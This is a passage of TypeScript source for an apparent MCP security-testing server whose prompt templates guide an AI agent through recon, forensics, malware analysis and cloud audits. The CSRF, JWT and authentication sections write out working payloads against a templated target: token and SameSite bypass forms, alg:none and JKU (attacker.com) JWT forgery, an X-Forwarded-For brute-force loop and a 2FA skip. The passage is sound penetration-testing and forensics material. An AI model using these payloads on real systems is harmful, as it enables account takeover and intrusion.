3. Check robots.txt, security.txt via \`recon_quick("${target}")\`.
4. Certificate Transparency logs: Search crt.sh for all issued certificates.
5. Check email security records:
   - SPF: \`dig TXT ${target}\` — look for v=spf1
   - DMARC: \`dig TXT _dmarc.${target}\`
   - DKIM: \`dig TXT selector._domainkey.${target}\` (try "default", "google", "k1")
   - MTA-STS: \`dig TXT _mta-sts.${target}\`
   - WARNING: Wildcard CNAME (\`*.${target} → ${target}\`) breaks ALL email security subdomains.

## Phase 2: Active Recon
6. \`recon_directory_bruteforce("${target}")\` — Discover hidden paths.
7. \`recon_vhost("${target}", "${target}")\` — Virtual host discovery.
8. \`recon_s3_bucket("assets.${target}")\` — Test S3 bucket access. Also try \`${target.replace(/\..+$/, "")}-assets\`, \`${target.replace(/\..+$/, "")}-backup\`, \`${target.replace(/\..+$/, "")}-staging\`.
9. Default virtual host access: Connect to the raw IP without a Host header to see the default vhost config.
   \`curl -sk https://IP_ADDRESS/ -H "Host: "\`

## Phase 3: Git History Investigation
If a git repository is accessible (exposed .git or cloned repo):
10. \`recon_git_secrets(REPO_PATH)\` — Scan for hardcoded secrets.
11. Manual git history review:
    - \`git log --all --oneline\` — All commit messages across all branches.
    - \`git log --diff-filter=D --summary\` — Find deleted files (often contain secrets).
    - \`git log --all --format='%an <%ae>'\` — Author names and emails (reveals internal team info).
    - \`git branch -a\` — All branch names (dev, staging, feature branches reveal architecture).
    - \`git log --all -p -- '*.env' '*.key' '*.pem' 'config.*'\` — Search for secrets in file history.
    - \`git stash list && git stash show -p\` — Check stashed changes.

## Phase 4: JavaScript Bundle Analysis
12. Download and analyze JS bundles:
    - For Next.js: \`/_next/static/chunks/\` directory
    - For Vite/React: \`/assets/\` directory
    - For Angular: \`/main.*.js\`, \`/runtime.*.js\`
13. Search bundles for:
    - API endpoints: grep for \`/api/\`, \`/v1/\`, \`/v2/\`, \`baseURL\`, \`apiUrl\`, \`remoteServiceBaseUrl\`
    - Hardcoded keys: grep for \`key\`, \`secret\`, \`token\`, \`password\`, \`VITE_\`, \`NEXT_PUBLIC_\`
    - Supabase: \`VITE_SUPABASE_URL\`, \`VITE_SUPABASE_ANON_KEY\`, \`VITE_SUPABASE_SERVICE_KEY\` (Vite inlines ALL \`VITE_\` env vars!)
    - Auth0: \`clientId\`, \`domain\`, \`audience\`, \`cacheLocation\` (localstorage = high severity for XSS)
    - AWS: \`AKIA\`, \`aws_access_key\`, \`aws_secret\`
    - Internal hostnames, staging URLs, admin endpoints

## Phase 5: Visual Recon
14. Take screenshots of:
    - Default landing page / login page
    - Error pages (404, 500) — may leak server version, framework, stack traces
    - Any admin panels discovered
15. Compare staging vs production deployments (staging often lacks WAF/bot protection).

## Phase 6: Technology Fingerprinting
16. Identify the tech stack from headers, cookies, and response patterns:
    - Server header, X-Powered-By, X-AspNet-Version
    - Cookie names: \`JSESSIONID\` (Java), \`PHPSESSID\` (PHP), \`ASP.NET_SessionId\` (.NET), \`_csrf\` (Rails)
    - Framework-specific paths: \`/wp-admin\` (WordPress), \`/elmah.axd\` (.NET), \`/actuator\` (Spring Boot)

## Key Checks
- 404 error pages: May leak server version, framework, or debug info.
- Custom response headers: Look for non-standard headers with sensitive data.
- Directory listing: /images/, /uploads/, /backup/ may have listing enabled.
- .git, .svn, .env, .DS_Store exposure.

## Phase 7: Automated Discovery
17. Run \`ffuf_fuzz("${target}", "/usr/share/wordlists/dirb/common.txt")\` for directory brute-force with response code filtering. Use recursion for discovered directories.
18. Run \`param_discover("${target}/api/endpoint")\` for hidden parameter discovery on key API endpoints — finds debug parameters, admin toggles, and undocumented fields.
19. Cross-reference discovered paths with JS bundle analysis results.`,
          },
        },
      ],
    })
  );

  // ---------------------------------------------------------------------------
  // 5. pcap_forensics (IMPROVED)
  // ---------------------------------------------------------------------------
  server.prompt(
    "pcap_forensics",
    "Step-by-step PCAP analysis workflow — credential extraction, attack detection, reverse shell identification, and timeline reconstruction.",
    { pcap_path: z.string().describe("Path to the PCAP file") },
    ({ pcap_path }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# PCAP Forensics Analysis Workflow

**PCAP File:** ${pcap_path}

## Step 1: Overview
Run \`pcap_overview("${pcap_path}")\` to get:
- Protocol hierarchy (what protocols are present)
- Endpoint statistics (who is talking to whom)
- Total packet count and capture duration

## Step 2: DNS Analysis
Run \`pcap_dns_analysis("${pcap_path}")\` to:
- List all DNS queries (reveals what the host was looking up)
- Identify DNS servers used
- Check for DNS tunneling indicators (unusual query lengths, high frequency, TXT record abuse)

## Step 3: Credential Extraction
Run \`pcap_extract_credentials("${pcap_path}", "all")\` to extract:
- FTP credentials (USER/PASS commands)
- HTTP Authorization headers (Basic/Bearer tokens)
- SMTP credentials (base64-encoded AUTH LOGIN/PLAIN)
- HTTP POST data (login forms)
- Telnet credentials

## Step 4: Port Scan Detection
Run \`pcap_detect_scan("${pcap_path}")\` to:
- Identify scanning IPs (high SYN packet count with many distinct destination ports)
- Determine targeted ports/services
- Detect scan type: SYN scan (SYN without ACK follow-up), connect scan, UDP scan
Manual tshark commands for deeper analysis:
\`\`\`
# Count SYN packets per source IP (scan detection)
tshark -r ${pcap_path} -Y "tcp.flags.syn==1 && tcp.flags.ack==0" -T fields -e ip.src | sort | uniq -c | sort -rn | head -20

# Show ports targeted by top scanner
tshark -r ${pcap_path} -Y "ip.src==SCANNER_IP && tcp.flags.syn==1" -T fields -e tcp.dstport | sort -u

# Detect half-open connections (SYN scan signature)
tshark -r ${pcap_path} -Y "tcp.flags.syn==1 && tcp.flags.ack==0" -T fields -e ip.src -e tcp.dstport | sort | uniq -c | sort -rn
\`\`\`

## Step 5: LLMNR/NTLM Detection
Run \`pcap_llmnr_ntlm("${pcap_path}")\` to detect:
- LLMNR poisoning attacks (multicast name resolution hijacking)
- NTLM credential capture (NTLMv1/NTLMv2 hashes in SMB/HTTP)
Manual tshark for NTLM:
\`\`\`
# Extract NTLM authentication attempts
tshark -r ${pcap_path} -Y "ntlmssp.messagetype == 0x00000003" -T fields -e ip.src -e ntlmssp.auth.username -e ntlmssp.auth.domain

# LLMNR queries (should not exist on a secure network)
tshark -r ${pcap_path} -Y "udp.dstport==5355" -T fields -e ip.src -e llmnr.query_name
\`\`\`

## Step 6: HTTP Brute-Force Detection
Look for authentication brute-force attempts:
\`\`\`
# Count HTTP POST requests to login endpoints per source IP
tshark -r ${pcap_path} -Y "http.request.method==POST && http.request.uri contains login" -T fields -e ip.src | sort | uniq -c | sort -rn

# Check for many 401/403 responses followed by a 200/302
tshark -r ${pcap_path} -Y "http.response.code==401 || http.response.code==403 || http.response.code==200" -T fields -e frame.time -e ip.dst -e http.response.code
\`\`\`

## Step 7: Reverse Shell Detection
Look for indicators of reverse shells:
\`\`\`
# Long-lived TCP connections to external IPs on high ports
tshark -r ${pcap_path} -Y "tcp.stream" -T fields -e tcp.stream -e ip.src -e ip.dst -e tcp.dstport | sort -u

# Look for shell commands in TCP streams (bash, sh, /bin)
tshark -r ${pcap_path} -Y "tcp contains \\"bin/bash\\" || tcp contains \\"bin/sh\\" || tcp contains \\"/etc/passwd\\"" -T fields -e frame.number -e ip.src -e ip.dst
\`\`\`
For suspicious streams, use \`pcap_follow_stream("${pcap_path}", STREAM_NUM)\` to read full conversations.

## Step 8: WAR File Upload Detection (Java app exploitation)
\`\`\`
# Detect file uploads via HTTP POST
tshark -r ${pcap_path} -Y "http.request.method==POST && http.content_type contains multipart" -T fields -e frame.number -e ip.src -e http.request.uri

# Look for .war, .jsp, .php uploads
tshark -r ${pcap_path} -Y "http.file_data contains \\".war\\" || http.file_data contains \\".jsp\\"" -T fields -e frame.number -e ip.src -e http.request.uri
\`\`\`

## Step 9: TLS Analysis
Run \`pcap_tls_analysis("${pcap_path}")\` to:
- Extract SNI values (reveals visited domains)
- Identify TLS versions in use
- Capture client randoms for potential decryption

## Step 10: HTTP Object Export
Run \`pcap_http_objects("${pcap_path}", "/tmp/pcap_export/")\` to:
- Export all downloaded files
- Look for malware, scripts, or sensitive documents
- Check file hashes against threat intelligence

## Reconstruction
Piece together the attack timeline:
1. Initial access (scan -> exploit / phishing)
2. Credential theft (NTLM capture, form interception)
3. Lateral movement (new connections from compromised host)
4. Privilege escalation (admin page access, WAR deployment)
5. Data exfiltration (large outbound transfers, DNS tunneling)
6. Persistence (reverse shell, backdoor upload)`,
          },
        },
      ],
    })
  );

  // ---------------------------------------------------------------------------
  // 6. memory_forensics (IMPROVED — minor)
  // ---------------------------------------------------------------------------
  server.prompt(
    "memory_forensics",
    "Memory dump analysis workflow using Volatility for incident response.",
    {
      dump_path: z.string().describe("Path to the memory dump file"),
      os_type: z.enum(["linux", "windows"]).default("linux").describe("Operating system type"),
    },
    ({ dump_path, os_type }) => {
      const text =
        os_type === "linux"
          ? `# Linux Memory Forensics Workflow

**Dump:** ${dump_path}

## Step 1: Identify OS
Run \`volatility_linux("${dump_path}", "PROFILE", "linux_banner")\` to confirm OS version.
(Determine the correct profile first — check the profile list or use strings on the dump.)

## Step 2: Process Analysis
- \`linux_pslist\` — List all processes. Look for suspicious names.
- \`linux_pstree\` — View parent-child relationships. Unusual children of init/systemd are suspicious.
- \`linux_bash\` — Extract bash history. May reveal attacker commands.
- \`linux_psaux\` — Full command lines for all processes.

## Step 3: Network Connections
- \`linux_netstat\` — Active connections. Look for:
  - Connections to unusual external IPs
  - Listening backdoor ports (high ports like 4444, 5555, 8080)
  - Reverse shell connections (established connection to attacker IP on high port)
  - Multiple connections from non-network processes (indicates compromise)

## Step 4: Rootkit Detection
Run \`memory_detect_rootkit("${dump_path}", "PROFILE")\` to check:
- Syscall table hooks (compare against clean kernel)
- Hidden kernel modules (lsmod vs actual module list)
- Process hiding (pslist vs psxview discrepancies)

## Step 5: File Enumeration
- \`linux_enumerate_files\` — Full filesystem listing.
- Look for recently modified files in /tmp, /dev/shm, /var/tmp.
- Look for suspicious cron entries (/var/spool/cron/).
- Check for dropped tools: nmap, nc, ncat, socat, chisel, reverse shell scripts.

## Step 6: Credential Recovery
- \`linux_bash\` — Commands may contain passwords passed as arguments.
- Look for su/sudo commands, ssh connections with embedded credentials.
- Check /etc/shadow access in file operations.

## Investigation Tips
- Base64-encoded strings in bash history often contain encoded payloads or flags.
- ncat/nc processes with established connections indicate reverse shells.
- Kernel module names that don't match standard modules indicate rootkits.
- Processes running from /tmp or /dev/shm are almost always malicious.
- Compare process creation timestamps to identify the initial compromise time.`
          : `# Windows Memory Forensics Workflow

**Dump:** ${dump_path}

## Step 1: System Info
Run \`volatility_windows("${dump_path}", "windows.info")\` to identify the OS version.

## Step 2: Process Analysis
- \`windows.pslist\` — List all processes.
- \`windows.pstree\` — View hierarchy. Look for:
  - cmd.exe/powershell.exe spawned by unusual parents (not explorer.exe)
  - rundll32.exe as child of unknown process (DLL injection)
  - svchost.exe not child of services.exe (impersonation)
  - wscript.exe/cscript.exe spawned by Office apps (macro execution)

## Step 3: Malware Detection
- \`windows.malfind\` — Detect injected code:
  - PAGE_EXECUTE_READWRITE memory = code injection indicator
  - MZ headers in non-image regions = process hollowing
  - Shellcode patterns (NOP sleds, syscall stubs)

## Step 4: Network Activity
- \`windows.netscan\` / \`windows.netstat\` — Active and recent connections.
- Correlate suspicious processes with network connections.
- Look for connections to known C2 ports (443, 8443, 8080, 4444).

## Step 5: Filesystem
- \`windows.filescan\` — Full file listing.
- \`windows.cmdline\` — Command-line arguments per process.
- \`windows.dlllist\` — DLLs loaded per process (look for unsigned or unusual DLLs).

## Step 6: Persistence
- \`windows.svcscan\` — Registered services (look for unusual service names/paths).
- \`windows.registry.hivelist\` — Registry hives for autorun entries.
- Check Run/RunOnce keys, Scheduled Tasks, WMI subscriptions.

## Step 7: Credential Extraction
- \`windows.hashdump\` — Extract NTLM hashes from SAM.
- \`windows.lsadump\` — Extract LSA secrets.
- Look for mimikatz artifacts in process memory.

## Key Indicators
- PAGE_EXECUTE_READWRITE + MZ header = classic process injection
- rundll32 as child of unknown = DLL injection technique
- VPN client processes may obscure C2 traffic from NIDS
- PowerShell with -enc (encoded commands) = likely malicious
- certutil -decode, bitsadmin /transfer = LOLBin activity`;

      return {
        messages: [
          {
            role: "user" as const,
            content: { type: "text" as const, text },
          },
        ],
      };
    }
  );

  // ---------------------------------------------------------------------------
  // 7. malware_analysis (IMPROVED — minor)
  // ---------------------------------------------------------------------------
  server.prompt(
    "malware_analysis",
    "Malware document analysis workflow for suspected Emotet/macro droppers and other maldoc types.",
    { file_path: z.string().describe("Path to the suspicious file") },
    ({ file_path }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# Malware Document Analysis Workflow

**File:** ${file_path}

## Step 1: Initial Triage
Run \`maldoc_analyze("${file_path}")\` for the full pipeline:
- OLE stream listing (streams marked 'M' contain macros)
- VBA macro extraction
- Auto-execution trigger identification
- Suspicious API detection
- IOC extraction (URLs, IPs)

## Step 2: Detailed Macro Analysis
Run \`maldoc_extract_macros("${file_path}")\` for raw VBA code.

## Step 3: Manual Deobfuscation Checklist
1. Find the auto-execution entry point (Document_open, AutoOpen, Workbook_Open, Auto_Open).
2. Trace the execution flow through function calls — map the call graph.
3. Look for string concatenation obfuscation: \`"pow" & "ersh" & "ell"\`.
4. Check user form storage for hidden data (TextBox.Text, Label.Caption — common in Emotet).
5. Identify padding patterns (repeated characters used as obfuscation filler).
6. Base64 decode any encoded strings.
7. Check for environment variable abuse: \`Environ("APPDATA")\`, \`Environ("TEMP")\`.
8. Look for WMI queries to detect sandbox: \`SELECT * FROM Win32_ComputerSystem\` checking for VMware/VirtualBox.

## Step 4: Payload Analysis
After deobfuscation, look for:
- PowerShell downloaders: \`DownloadString\`, \`DownloadFile\`, \`IEX\`, \`Invoke-Expression\`
- WMI process creation: \`win32_Process.Create\`, \`winmgmts\`
- certutil abuse: \`certutil -decode\`, \`certutil -urlcache\`
- MSHTA: \`mshta.exe http://...\` (HTA execution)
- Regsvr32: \`regsvr32 /s /n /u /i:http://... scrobj.dll\` (COM scriptlet execution)
- Multiple fallback download URLs (Emotet typically has 5-7 URLs)
- Scheduled task creation for persistence

## Step 5: IOC Collection
- Download URLs (primary and fallback)
- C2 server IPs and domains
- File hashes (MD5, SHA1, SHA256 of the document AND any dropped payloads)
- Registry keys modified
- Scheduled tasks created
- Mutex names (used for single-instance check)
- User-Agent strings used in HTTP requests

## Common Patterns
- VBA macro -> deobfuscate base64 from form -> PowerShell -> WMI -> download payload
- Living-off-the-land: Uses built-in Windows tools (certutil, mshta, regsvr32, bitsadmin) to avoid detection.
- Multi-stage: Initial dropper downloads a loader, which downloads the final payload.
- Geofencing: Payload only downloads from specific IP ranges/countries.`,
          },
        },
      ],
    })
  );

  // ---------------------------------------------------------------------------
  // 8. cloud_security_audit (IMPROVED)
  // ---------------------------------------------------------------------------
  server.prompt(
    "cloud_security_audit",
    "Cloud security investigation workflow — AWS CloudTrail analysis with jq patterns for anomaly detection.",
    { log_dir: z.string().describe("Path to CloudTrail log directory") },
    ({ log_dir }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# Cloud Security Audit Workflow

**CloudTrail Logs:** ${log_dir}

## Step 1: Log Overview
Run \`cloudtrail_analyze("${log_dir}")\` to get:
- Event timeline
- Unique users/roles
- Event type frequency
- Source IPs
- Error events

## Step 2: Anomaly Detection
Run \`cloudtrail_find_anomalies("${log_dir}")\` to identify:
- Non-AWS source IPs (potential external attackers)
- Role assumption chains (lateral movement)
- Sensitive API calls (CreateUser, CreateAccessKey, DeleteTrail)
- Data access events (GetObject, ListBuckets)

## Step 3: Manual jq Analysis Patterns

### Identify all unique source IPs and map to events
\`\`\`
cat ${log_dir}/*.json | jq -r '.Records[] | [.sourceIPAddress, .eventName, .userIdentity.arn] | @tsv' | sort | uniq -c | sort -rn
\`\`\`

### Find non-AWS IP addresses (external actors)
AWS internal IPs come from services like cloudformation.amazonaws.com. Filter these out:
\`\`\`
cat ${log_dir}/*.json | jq -r '.Records[] | select(.sourceIPAddress | test("^[0-9]")) | .sourceIPAddress' | sort -u
\`\`\`
Cross-reference these IPs with known AWS IP ranges (available at https://ip-ranges.amazonaws.com/ip-ranges.json). Any IP NOT in AWS ranges is external.

### Find IAM escalation events
\`\`\`
cat ${log_dir}/*.json | jq -r '.Records[] | select(.eventName | test("CreateUser|CreateAccessKey|AttachUserPolicy|PutUserPolicy|CreateLoginProfile|UpdateLoginProfile|AddUserToGroup|CreateRole|AttachRolePolicy")) | [.eventTime, .sourceIPAddress, .userIdentity.arn, .eventName] | @tsv'
\`\`\`

### Find data exfiltration indicators
\`\`\`
cat ${log_dir}/*.json | jq -r '.Records[] | select(.eventName | test("GetObject|PutBucketPolicy|PutBucketAcl|GetBucketAcl")) | [.eventTime, .sourceIPAddress, .eventName, .requestParameters.bucketName] | @tsv' | sort
\`\`\`

### Find anti-forensic actions
\`\`\`
cat ${log_dir}/*.json | jq -r '.Records[] | select(.eventName | test("DeleteTrail|StopLogging|DeleteFlowLogs|DeleteEventBus")) | [.eventTime, .sourceIPAddress, .userIdentity.arn, .eventName] | @tsv'
\`\`\`

### Find failed authentication attempts
\`\`\`
cat ${log_dir}/*.json | jq -r '.Records[] | select(.errorCode != null) | [.eventTime, .sourceIPAddress, .errorCode, .eventName, .userIdentity.arn] | @tsv' | sort
\`\`\`

## Step 4: Investigation
For each anomalous IP:
1. Check which user account it is associated with.
2. Trace all API calls from that IP chronologically.
3. Check for role assumption chains (AssumeRole events).
4. Look for privilege escalation patterns (CreateUser -> AttachUserPolicy -> CreateAccessKey).
5. Look for persistence mechanisms (new access keys, login profiles, roles).

## Step 5: Data Exfiltration Check
- S3 GetObject events from unusual IPs — especially large numbers in short timeframes.
- Bucket policy changes (PutBucketPolicy making buckets public).
- Cross-account role assumptions to external AWS accounts.
- EC2 snapshot sharing to external accounts.

## Step 6: Timeline Reconstruction
Build a chronological attack narrative:
1. Initial access (compromised credentials, exposed access key)
2. Enumeration (ListBuckets, DescribeInstances, GetCallerIdentity)
3. Privilege escalation (AssumeRole, AttachUserPolicy, CreateAccessKey)
4. Data exfiltration (GetObject, DownloadDBSnapshot)
5. Persistence (CreateAccessKey, CreateLoginProfile, backdoor IAM role)
6. Anti-forensics (DeleteTrail, StopLogging, modify CloudWatch rules)`,
          },
        },
      ],
    })
  );

  // ---------------------------------------------------------------------------
  // 9. csrf_methodology (NEW)
  // ---------------------------------------------------------------------------
  server.prompt(
    "csrf_methodology",
    "Complete CSRF testing methodology — token bypass, Referer exploitation, SameSite bypass techniques.",
    {
      target_url: z.string().describe("Target URL with state-changing action to test"),
      parameter: z.string().describe("Key parameter in the state-changing request (e.g., 'email', 'password')"),
    },
    ({ target_url, parameter }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# CSRF Testing Methodology

**Target:** ${target_url}
**Parameter:** ${parameter}

## Step 1: Identify CSRF Protections
1. Run \`auth_csrf_extract("${target_url}")\` to find CSRF tokens in forms.
2. Check cookie flags: \`curl -sk -D - -o /dev/null "${target_url}"\` — look for SameSite attribute.
3. Check if the server validates the Referer header.
4. Identify the token delivery mechanism: hidden field, custom header, cookie-to-header pattern.

## Step 2: Token Validation Bypasses

### 2a. Remove the token entirely
Delete the CSRF token parameter from the request. Many implementations only validate IF the token is present.
\`\`\`html
<form action="${target_url}" method="POST">
  <input type="hidden" name="${parameter}" value="attacker-value">
  <!-- No CSRF token field at all -->
  <input type="submit">
</form>
\`\`\`

### 2b. Method switching
If POST has CSRF protection, try GET — many servers only enforce CSRF on POST:
\`\`\`html
<img src="${target_url}?${parameter}=attacker-value">
\`\`\`

### 2c. Cross-session token swap
Get a CSRF token from your own session, then use it in the victim's request. If the server validates tokens against a global pool rather than per-session, this works.

### 2d. CSRF token in cookie (duplicate cookie-to-body)
If the CSRF token is set via cookie AND validated against a body parameter:
\`\`\`html
<!-- Inject a cookie via CRLF or subdomain XSS, then submit form with matching value -->
<img src="https://subdomain.target.com/?search=test%0d%0aSet-Cookie:csrf=FAKE" onerror="document.forms[0].submit()">
<form action="${target_url}" method="POST">
  <input type="hidden" name="csrf" value="FAKE">
  <input type="hidden" name="${parameter}" value="attacker-value">
</form>
\`\`\`

### 2e. CRLF injection to set CSRF cookie
If any parameter reflects in response headers without sanitizing \\r\\n:
\`\`\`
/search?q=test%0d%0aSet-Cookie:csrf=attacker_token
\`\`\`

## Step 3: Referer-Based CSRF Bypass

### 3a. Suppress the Referer header entirely
\`\`\`html
<meta name="referrer" content="never">
<form action="${target_url}" method="POST">
  <input type="hidden" name="${parameter}" value="attacker-value">
  <input type="submit">
</form>
\`\`\`
If the server only validates Referer when present (but accepts missing Referer), this bypasses it.

### 3b. Referer spoofing via history.pushState
Put the target domain in the Referer path or query string:
\`\`\`html
<script>
  history.pushState('', '', '/?${target_url.replace(/https?:\/\//, '')}');
  document.forms[0].submit();
</script>
<form action="${target_url}" method="POST">
  <input type="hidden" name="${parameter}" value="attacker-value">
</form>
\`\`\`
The Referer becomes \`https://attacker.com/?target.com/path\` which passes loose substring matching.

## Step 4: SameSite Cookie Bypass

### 4a. SameSite=Lax bypass via method override
Lax allows GET requests from cross-site. If the server supports method override:
\`\`\`html
<form action="${target_url}?_method=POST" method="GET">
  <input type="hidden" name="${parameter}" value="attacker-value">
  <input type="submit">
</form>
\`\`\`

### 4b. SameSite=Strict bypass via client-side redirect
If the target has an open redirect or client-side redirect on the same origin:
\`\`\`html
<!-- Redirect through target's own domain to make it a same-site request -->
<a href="https://target.com/redirect?url=/change-email?${parameter}=attacker-value">Click here</a>
\`\`\`
The browser treats the navigation as same-site after the redirect.

### 4c. SameSite=Strict bypass via sibling subdomain XSS
If you have XSS on any subdomain (e.g., blog.target.com), requests from that subdomain to target.com are same-site.

### 4d. Chrome 2-minute Lax exemption
Chrome does NOT enforce SameSite=Lax for top-level POST requests within 2 minutes of the cookie being set. If you can trigger the victim to get a fresh session cookie, you have a 2-minute CSRF window.
\`\`\`html
<!-- First, pop up the target site to trigger a fresh cookie -->
<script>
  window.open('https://target.com/login');
  setTimeout(() => { document.forms[0].submit(); }, 3000);
</script>
<form action="${target_url}" method="POST">
  <input type="hidden" name="${parameter}" value="attacker-value">
</form>
\`\`\`

## Step 5: Verification
Test each bypass by:
1. Hosting the PoC HTML on a different origin (use Python HTTP server or Burp Collaborator).
2. Authenticating as a test user in the browser.
3. Visiting the PoC page — if the action executes, CSRF is confirmed.
4. Document which protection was bypassed and how.`,
          },
        },
      ],
    })
  );

  // ---------------------------------------------------------------------------
  // 10. jwt_methodology (NEW)
  // ---------------------------------------------------------------------------
  server.prompt(
    "jwt_methodology",
    "JWT security testing methodology — algorithm confusion, weak keys, header injection, KID traversal.",
    {
      target_url: z.string().describe("Target URL of the application using JWT authentication"),
    },
    ({ target_url }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# JWT Security Testing Methodology

**Target:** ${target_url}

## Step 1: Obtain and Decode JWTs
1. Authenticate to the application and capture the JWT from:
   - Authorization header: \`Authorization: Bearer eyJ...\`
   - Cookies (check Set-Cookie headers)
   - Response body after login
2. Decode without verification: Split on '.', base64-decode header and payload.
3. Note the algorithm (alg), key ID (kid), issuer (iss), audience (aud), and any custom claims.

## Step 2: Algorithm "none" Attack
If the server doesn't enforce algorithm verification:
\`\`\`
Original header: {"alg":"RS256","typ":"JWT"}
Modified header: {"alg":"none","typ":"JWT"}
\`\`\`
Base64-encode the modified header, keep the original payload, remove the signature (but keep the trailing dot):
\`\`\`
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTcwMH0.
\`\`\`
Also try: \`"alg":"None"\`, \`"alg":"NONE"\`, \`"alg":"nOnE"\`.

Send this to a protected endpoint:
\`curl -sk "${target_url}/api/me" -H "Authorization: Bearer MODIFIED_JWT"\`

## Step 3: HS256 Weak Key Cracking
If the JWT uses HS256 (symmetric), the signing key can be brute-forced:
\`\`\`
# Save the JWT to a file
echo -n "eyJ...full.jwt.here" > jwt.txt

# Crack with hashcat
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Also try known defaults:
# - "secret", "password", "key", the app name, "APPNAME_C421AAEE0D114E9C"
\`\`\`
If cracked, forge new tokens with arbitrary claims:
\`\`\`javascript
// Using Node.js
const jwt = require('jsonwebtoken');
const token = jwt.sign({sub: 'admin', role: 'administrator'}, 'cracked_secret', {algorithm: 'HS256'});
\`\`\`

## Step 4: Algorithm Confusion (RS256 -> HS256)
If the server uses RS256 (asymmetric) but doesn't enforce the algorithm:
1. Obtain the server's public key (from /.well-known/jwks.json, /certs, or TLS certificate).
2. Change the JWT header from \`"alg":"RS256"\` to \`"alg":"HS256"\`.
3. Sign the modified token using the PUBLIC key as the HMAC secret.
The server uses the public key to verify — since it now treats it as HS256, the public key IS the secret.
\`\`\`
# Get the public key
curl -sk "${target_url}/.well-known/jwks.json" | jq '.keys[0]'

# Convert JWK to PEM if needed, then sign with it as HS256 secret
\`\`\`

## Step 5: JWK Header Injection
Embed your own signing key directly in the JWT header:
\`\`\`json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "YOUR_PUBLIC_KEY_N",
    "e": "AQAB"
  }
}
\`\`\`
Generate your own RSA keypair, sign the token with your private key, and embed your public key in the header. If the server trusts the embedded JWK, it will verify against YOUR key.

## Step 6: JKU Header Injection
Point the JWT to your own key server:
\`\`\`json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/.well-known/jwks.json"
}
\`\`\`
Host a JWKS endpoint on your server with your public key. Sign the token with your private key.
If the server fetches from the provided JKU URL without validation, it will verify against your key.

## Step 7: KID Path Traversal
The "kid" (Key ID) parameter can sometimes be exploited for path traversal:
\`\`\`json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../dev/null"
}
\`\`\`
Sign the token with an empty string as the secret (since /dev/null returns empty).
Other targets: \`"kid": "../../../../../../etc/hostname"\` (sign with the hostname as secret).

## Step 8: Claim Manipulation
After obtaining a valid signing method (cracked key, algorithm confusion, etc.):
- Change \`"sub"\` to "admin" or another user.
- Change \`"role"\` / \`"admin"\` / \`"is_admin"\` claims.
- Extend \`"exp"\` far into the future.
- Change \`"iss"\` to see if issuer validation exists.
- Add claims that shouldn't exist (e.g., \`"scope": "admin"\`).

## Step 9: Verification
For each attack that produces a token accepted by the server:
1. Use the forged token on an endpoint that requires specific privileges.
2. Confirm you can access data/actions not available with your original token.
3. Document the exact steps to reproduce.`,
          },
        },
      ],
    })
  );

  // ---------------------------------------------------------------------------
  // 11. auth_methodology (NEW)
  // ---------------------------------------------------------------------------
  server.prompt(
    "auth_methodology",
    "Authentication security testing — username enumeration, rate limit bypass, 2FA bypass, password reset poisoning.",
    {
      target_url: z.string().describe("Target URL of the login/auth endpoint"),
    },
    ({ target_url }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# Authentication Security Testing Methodology

**Target:** ${target_url}

## Step 1: Username Enumeration

### 1a. Response difference
Send login requests with a VALID username + wrong password vs an INVALID username + wrong password.
Compare: response body text, status code, response headers, response length.
Even subtle differences ("Invalid password" vs "Invalid username or password") confirm enumeration.
\`\`\`
curl -sk -X POST "${target_url}" -d "username=admin&password=wrong123" -o /tmp/valid_user.txt -w "%{http_code}:%{size_download}"
curl -sk -X POST "${target_url}" -d "username=nonexistent_user_xyz&password=wrong123" -o /tmp/invalid_user.txt -w "%{http_code}:%{size_download}"
diff /tmp/valid_user.txt /tmp/invalid_user.txt
\`\`\`

### 1b. Timing attack (bcrypt)
If the app uses bcrypt, valid usernames trigger password hash comparison (~100ms+), while invalid usernames return immediately:
\`\`\`
# Time the response for a valid user
time curl -sk -X POST "${target_url}" -d "username=admin&password=wrong"
# Time the response for an invalid user
time curl -sk -X POST "${target_url}" -d "username=nonexistent_xyz_user&password=wrong"
\`\`\`
A consistent timing difference (e.g., 200ms vs 50ms) confirms enumeration via timing side-channel.

### 1c. Account lockout oracle
If the app locks accounts after N failed attempts, you can enumerate by attempting N+1 logins:
- Locked account: "Account locked" message
- Non-existent account: "Invalid credentials" message
The different error messages confirm whether the account exists.

### 1d. Password change / Registration form
Check other forms — registration ("username taken"), password reset ("no account found"), password change forms may have different enumeration protections.

## Step 2: Brute-Force with Rate Limit Bypass

### 2a. Basic brute-force
Run \`auth_bruteforce("${target_url}")\` with realistic credential pairs (james.wilson, sarah.chen — NEVER use "hacker" or "test" usernames).

### 2b. X-Forwarded-For rotation
If rate limiting is IP-based, rotate the source IP via headers:
\`\`\`
for i in $(seq 1 100); do
  curl -sk -X POST "${target_url}" \\
    -H "X-Forwarded-For: 192.168.1.$i" \\
    -H "X-Real-IP: 10.0.0.$i" \\
    -d "username=admin&password=password$i" \\
    -w "%{http_code}" -o /dev/null
done
\`\`\`

### 2c. Interleaved login attempts
If lockout is per-account after N failures, interleave attempts across accounts:
\`\`\`
# Instead of: admin/pass1, admin/pass2, admin/pass3 (locks admin)
# Do: admin/pass1, victim/pass1, admin/pass2, victim/pass2 (resets counter between)
\`\`\`

### 2d. JSON array / Batch login
Some APIs accept arrays — send multiple credentials in one request to bypass per-request rate limits:
\`\`\`json
[{"username":"admin","password":"pass1"},{"username":"admin","password":"pass2"}]
\`\`\`

## Step 3: 2FA Bypass

### 3a. Direct page access
After entering valid credentials, skip the 2FA page by navigating directly to the post-login page:
\`curl -sk "${target_url}/my-account" -b "session=PRE_2FA_SESSION_COOKIE"\`

### 3b. Brute-force 2FA code
If the code is 4-6 digits, brute-force if no rate limiting exists:
\`\`\`
